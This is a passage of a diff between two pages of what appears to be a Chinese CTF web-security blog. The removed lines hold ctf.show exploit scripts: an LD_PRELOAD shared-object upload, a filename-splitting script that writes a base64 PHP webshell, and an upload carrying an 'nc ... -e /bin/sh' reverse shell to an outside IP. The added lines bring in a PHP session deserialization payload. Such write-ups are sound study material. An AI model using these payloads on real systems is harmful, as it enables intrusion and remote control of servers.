-<p>so文件拓展是system新建进程触发的，原理和上题一样，但用的是临时文件上传的方式写文件(这题&#x2F;tmp目录有写文件的权限，所以不需要条件竞争)</p>
-<p>关于这里为啥是[2]？因为如果tmp目录为空，第一个是.目录，第二个是..目录，第三个元素就是我们上传的临时文件名</p>
-<p>用的还是上面的so文件</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://d232d316-e893-4ab6-8525-726550153e15.challenge.ctf.show/?env=LD_PRELOAD=/tmp/&quot;</span></span><br><span class="line">file=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;exp.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">res=requests.post(url,files=file)</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="限制长度下的命令执行"><a href="#限制长度下的命令执行" class="headerlink" title="限制长度下的命令执行"></a>限制长度下的命令执行</h1><blockquote>
-<p><font style="color:rgb(23, 35, 63);">在linux中，我们使用ls -t命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706729207-9894352c-7b1c-4a01-961c-6b92a0a566cc.png"></p>
-<p><font style="color:rgb(23, 35, 63);">我们来看看ls -t&gt;ghtwf01有什么效果(开始不存在ghtwf01这个文件)</font><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706739103-3399e69b-c604-4912-a4f8-7d80ad70e099.png"></p>
-<p>这条命令先执行了创建ghtwf01文件然后将ls -t的执行结果写入ghtwf01文件</p>
-<p>我们试试用这些方法来执行命令cat flag</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706755075-26be979a-1e59-46af-85d4-aa663bddb289.png"></p>
-<p>读取到了flag内容为this is your flag，无论这个文件里面有不有其它内容都能执行</p>
-<p>总而言之文件构造绕过就是如下知识：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706765444-cc0f66d0-56af-40d3-b636-fdca1bc40c2f.png"></p>
-</blockquote>
-<h2 id="可写web目录"><a href="#可写web目录" class="headerlink" title="可写web目录"></a>可写web目录</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706778862-bec43b1a-3d71-4874-949b-d9e94c32dd59.png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://ff2d125b-85e0-4c9a-a5bb-ac6ff03890f5.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&quot;&gt;hp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;1.p\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;d\\&gt;\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\\ -\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;e64\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;bas\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;7\\|\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;XSk\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;Fsx\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;dFV\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;kX0\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;bCg\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;XZh\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;AgZ\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;waH\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;PD9\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;o\\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;ech\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls -t&gt;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;. 0&quot;</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeFile</span>(<span class="params">payload</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">        writeFile(p.strip())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] create &quot;</span> + p.strip())</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    response = requests.get(url + <span class="string">&quot;1.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span> + url + <span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    run()</span><br><span class="line">    check()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>用&#x2F;1.php?1&#x3D;eval($_POST[1]);转接post连蚁剑</p>
-<h2 id="不可写web目录"><a href="#不可写web目录" class="headerlink" title="不可写web目录"></a>不可写web目录</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706966733-d73c76de-ff8e-482e-8a36-9e1d18e445e6.png"></p>
-<p>怎么缩也不可能7字以内外带的吧，只能思考是不是执行临时文件之类的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://b5c4ec71-c6bd-4e47-97a9-404d5de7cc69.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;nc  124.222.136.33 1337 -e /bin/sh&#x27;</span>&#125;</span><br><span class="line">r= requests.post(url,files=file,data=&#123;<span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;. /t*/*&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706980438-9409a761-9b1a-420d-9e57-c13041ff74c6.png"></p>
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293514891-7e51d58b-beaa-4d7b-9211-737acdaa7607.png"></p>
+<p>payload：<code>O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
+<p>然后传入<code>session.php</code>：</p>
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293526124-e212be59-1a8e-410b-bdc1-4f87cb9de90c.png"></p>
+<p>此时的 <code>session</code>内容如下：</p>
+<p><code>a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;</code></p>
+<p>再次访问<code>class.php</code>文件的时候：</p>
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293541065-1ccc3614-0831-471b-b826-b5f5082caab1.png"></p>
 
       
 
@@ -478,7 +291,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://blog.warrenli.fun/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -492,18 +305,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2025/03/26/JWT%E6%94%BB%E5%87%BB/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          (no title)
+          pearcmd.php的妙用
         
       </div>
     </a>
   
   
-    <a href="/2025/03/26/PHP%E7%89%B9%E6%80%A7/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title"></div>
+    <a href="/2025/03/31/PHP%E7%89%B9%E6%80%A7/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP特性</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -530,7 +343,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#flask%E7%AE%97pin"><span class="toc-number">1.</span> <span class="toc-text">flask算pin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.</span> <span class="toc-text">phar文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">phar反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#open-basedir%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">open_basedir绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">5.</span> <span class="toc-text">pear文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%89%93PHP-FPM"><span class="toc-number">6.</span> <span class="toc-text">SSRF打PHP-FPM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81getuid"><span class="toc-number">7.</span> <span class="toc-text">劫持getuid</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%9E%84%E9%80%A0%E5%99%A8"><span class="toc-number">8.</span> <span class="toc-text">劫持构造器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">临时文件利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">10.</span> <span class="toc-text">限制长度下的命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%86%99web%E7%9B%AE%E5%BD%95"><span class="toc-number">10.1.</span> <span class="toc-text">可写web目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%8F%AF%E5%86%99web%E7%9B%AE%E5%BD%95"><span class="toc-number">10.2.</span> <span class="toc-text">不可写web目录</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">三种处理器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text">php 处理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">php_serialize 处理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">php_binary处理器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-serialize%E5%92%8Cphp%E5%A4%84%E7%90%86%E5%99%A8%E5%90%8C%E6%97%B6%E5%BC%80%E5%90%AF%E8%A7%A6%E5%8F%91bug"><span class="toc-number">2.</span> <span class="toc-text">php_serialize和php处理器同时开启触发bug</span></a></li></ol>
                     </div>
                 </span>
             </div>
